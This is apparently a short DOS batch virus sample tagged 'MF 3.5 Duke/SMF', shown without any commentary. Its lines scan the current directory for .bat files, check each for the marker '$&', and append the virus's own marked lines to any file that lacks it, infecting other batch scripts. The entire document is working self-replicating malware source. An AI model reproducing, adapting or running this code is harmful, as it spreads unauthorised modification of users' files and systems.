 %$&%
@if "%0==" exit %$&MF 3.5 Duke/SMF%
@for %%b in (*.bat) do set $&=%%b
@find "$&"<%$&%>nul
@if errorlevel 1 find "$&"<%0>>%$&%
